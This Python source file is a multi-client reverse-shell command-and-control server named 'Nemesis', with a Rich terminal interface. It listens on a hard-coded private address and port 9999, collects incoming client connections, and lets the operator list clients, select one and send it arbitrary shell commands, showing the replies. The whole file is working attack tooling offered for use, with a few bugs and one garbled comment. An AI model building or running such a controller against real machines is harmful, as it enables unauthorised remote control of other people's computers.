# # # IMPORT OUR SHIT # # #



import socket
import threading
import sys
import time
from rich.console import Console
from rich.layout import Layout
from rich.live import Live
from queue import Queue
from time import sleep


# # # DECLARE SOME GLOBAL VARIABLES # # #


global NUMBER_OF_THREADS
NUMBER_OF_THREADS = 3

global JOB_NUMBER 
JOB_NUMBER = [1, 2, 3]

global queue
queue = Queue()

global all_connections 
all_connections = []

global all_address
all_address = []

global header_print
header_print = ""

global shell_print
shell_print = ""

global side_print 
side_print = ""



# #################################################################################################################### #


                                            # # # INITIATE RICH # # #


# #################################################################################################################### #


console = Console()
layout = Layout()

# # # RECOMMENDED TERMINAL DIMENSIONS : 115 x 35 # # #

# # # DIVIDE THE OUTPUT IN TWO PARTS # # #
layout.split(
    Layout(name="header", size=10),
    Layout(ratio=1, name="main"),
)
# # # DIVIDE THE "MAIN" LAYOUT IN TO "side" AND "shell" # # #
layout["main"].split(
    Layout(name="shell", ratio=4),
    Layout(name="side"),
    direction="horizontal"
)


# #################################################################################################################### #

                                          # # # 1rst THREAD FONDCTIONS # # #

# #################################################################################################################### #


# # # CREATE A SOCKET TO CONNECT 2 COMPUTERS # # #
def create_socket():
    try:
        global host
        global port
        global socket
        global header_print

        host = "192.168.50.185"
        port = 9999
        socket = socket.socket()

    except socket.error as msg:
        layout["header"].update('scoket creation error: %s ' % msg)


# -------------------------------------------------------------------------------------------------------------------- #

# # # BIDING THE SOCKET AND LISTENING FOR CONNECTIONS # # #
def bind_socket():
    try:
        global host
        global port
        global socket
        global header_print


        header_print += 'biding the port: %s \r\n' % port

        layout["header"].update(header_print)
        socket.bind((host, port))
        socket.listen(5)
        header_print += "The server is initialized, I\'m listening... \r\n"
        layout["header"].update(header_print)

    except socket.error as msg:

        layout["header"].update('socket biding error: %s + \n Retrying...' % msg)
        bind_socket()


# -------------------------------------------------------------------------------------------------------------------- #

# # # HANDLE CONNECTION AND SAVE THEM IN OUR LISTS # # #
# # # CLOSE PREVIOUS CONNECTION WHEN TCP_server.py is restarted # # #
def accept_connection():
    global header_print

    for conn in all_connections:
        conn.close()

    del all_connections[:]
    del all_address[:]

    while True:
        try:
        
            conn, address = socket.accept()
        
            # # # PREVENT TIMEOUT # # #
            socket.setblocking(1)
        
            all_connections.append(conn)
            all_address.append(address)
            
            header_print += '\n connection established | IP address : %s | port: %d \r\n' % (address[0], address[1])
            layout["header"].update(header_print)
        
        except:
        
            layout["header"].update("error accepting connection")


# -------------------------------------------------------------------------------------------------------------------- #



# #################################################################################################################### #

                                          # # # 2nd THREAD FONDCTIONS # # #

# #################################################################################################################### #
# # # SEE ALL THE CLIENTS #
# # # SELECT A SPECIFIC CLIENT #
# # # SEND COMMANDS TO THIS CLIENT #
# # # INTERACTIV PROMPT FOR SENDING COMMANDS #

#  Nemesis> list
# ---- CLIENTS LIST ----
# id : 0 | ip address : 192.168.0.2 |  port : 9999
# id : 1 | ip address : 192.168.0.3 |  port : 9999
# id : 2 | ip address : 192.168.0.4 |  port : 9999
# Nemesis> select 1
# 192.168.0.2>


def start_Nemesis():
    global shell_print

    while True:
        if all_connections[:]:
            shell_print += "\r\n  Nemesys >  "
            layout["shell"].update(shell_print)
            cmd = console.input()
            if cmd == 'list' or cmd == 'ls':
                list_connection()
            elif 'select' in cmd:
                conn = get_target(cmd)
                if conn is not None:
                    send_target_command(conn)
            elif cmd == 'quit':
                conn.close()
                socket.close()
                sys.exit()
            else:
                shell_print += 'command not recognized \r\n'
                layout["shell"].update(shell_print)



# -------------------------------------------------------------------------------------------------------------------- #


                             # # # DISPLAY ALL CURRENT ACTIVE CO(header_printNNECTIONS # # #


def list_connection():
    global side_print
    results = ''

    side_print += "----------------------------------------- CLIENTS LIST -----------------------------------------\r\n\r\n"
    layout["side"].update(side_print)

    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(''))
            conn.recv(201480)
        except:
            del all_connections[i]
            del all_address[i]
            continue

        results = 'id : ' + str(i) + ' | ip address : ' + str(all_address[i][0]) + '|  port :' + str(all_address[i][1]) + "\r\n"

        side_print += results

        # results exemple = id : 1 | ip address : 123.223.221.012  | port : 9999

        layout["side"].update(side_print)


# -------------------------------------------------------------------------------------------------------------------- #


def get_target(cmd, end=None):
    global shell_print
    try:
        target = cmd.replace('select ', '')  # target value = "id"
        target = int(target)
        conn = all_connections[target]
 
        shell_print += 'you are now connected to %s \r\n' % all_address[target][0]
        layout["shell"].update(shell_print)
        
        shell_print += "N  " + str("\r\n" + all_address[target][0]) + '>'
        console.input(shell_print)
 
        return conn
        # exemple : 192.168.0.2> ...

    except:
        shell_print += "Selection not valid"
        layout["shell"].update("Selection not valid")
        return None

    # ---------------------------------------------------------------------------------------------------------------- #


def send_target_command(conn):
    global shell_print
    while True:
        try:
            cmd = console.input('  Nemesys >  ')
            if cmd == 'quit':
                start_Nemesis()
            elif len(cmd) > 0:
                conn.send(cmd.encode())
                client_response = conn.recv(1024)
                client_response = client_response.decode('utf8')
                client_response = str(client_response)

                shell_print += "%s" % client_response
                layout["shell"].update(shell_print)
            else:
                shell_print += "enter a command !"
                layout["shell"].update(shell_print)
        except:
            shell_print += 'Error sending of Receiving commands'
            layout["shell"].update(shell_print)
            break


# -------------------------------------------------------------------------------------------------------------------  #


def Nemesys_soul():
    with Live(layout, screen=True):
        while True:
            sleep(1)


# -------------------------------------------------------------------------------------------------------------------  #

# # # DO NEXT JOB THAT IS IN THE QUEUE # # #
def work():
    while True:
        x = queue.get()
        if x == 1:
            Nemesys_soul()

        if x == 2:            
            create_socket()
            bind_socket()
            accept_connection()

        if x == 3:
            start_Nemesis()

        queue.task_done()


# # # CREATE WORKERS THREADS # # #


def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()


# #################################################################################################################### #

# # #                                                MAIN FONCTION                                                 # # #

# #################################################################################################################### #

create_workers()
create_jobs()